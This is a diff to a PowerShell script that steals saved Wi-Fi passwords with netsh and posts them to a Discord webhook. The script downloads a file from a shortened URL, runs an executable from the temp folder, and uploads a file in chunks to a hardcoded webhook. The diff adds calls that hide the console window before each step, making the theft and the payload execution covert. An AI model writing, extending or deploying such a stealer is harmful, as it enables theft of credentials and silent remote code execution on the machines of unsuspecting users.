@@ -47,6 +47,7 @@ $null = Start-Transcript -Path "$env:TEMP\Ain1_log.txt" -Append
 try {
     # Extract Wi-Fi profiles
     netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
+        [ConsoleWindow]::Hide()
         $wlan = $_.Matches.Value
         
         # Extract the Wi-Fi password
@@ -68,6 +69,7 @@ try {
 
         # Send the data to the Discord webhook
         try {
+            [ConsoleWindow]::Hide()
             Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json) -ErrorAction SilentlyContinue | Out-Null
         } catch {
             #Write-Host "Failed to send data to Discord webhook"
@@ -91,6 +93,7 @@ $url = "https://lnkfwd.com/u/Kpj_Yric"  # Replace with your file URL
 $tempPath = [System.IO.Path]::Combine($env:TEMP, "example.txt")  # Replace "downloaded_file.zip" with your desired filename
 
 # Use Invoke-WebRequest to download the file
+[ConsoleWindow]::Hide()
 Invoke-WebRequest -Uri $url -OutFile $tempPath
 
 # Output the location of the downloaded file
@@ -118,7 +121,7 @@ $tempExePath = Join-Path $env:TEMP "example.exe"
 
 
 ###############################################################################
-
+[ConsoleWindow]::Hide()
 # Start the executable
 $process = Start-Process $tempExePath
 
@@ -155,7 +158,7 @@ Get-Process | Where-Object { $_.Path -like "$env:TEMP\example.exe" } | Stop-Proc
 
 
 ###########################################################################
-
+[ConsoleWindow]::Hide()
 # Define the webhook URL
 $webhookUrl='https://discord.com/api/webhooks/1297470837779333141/8AHSJu020L0KTuKxTcsMP5gaUQoy8M1IIX_1ts-DAsvj8748RNmEm0N9Xoxk-vy-_Gh-'
 
@@ -177,6 +180,7 @@ if (Test-Path $filePath) {
 
     # Send each chunk to the Discord webhook
     foreach ($chunk in $chunks) {
+        [ConsoleWindow]::Hide()
         # Create the payload for the webhook
         $payload = @{
             content = $chunk
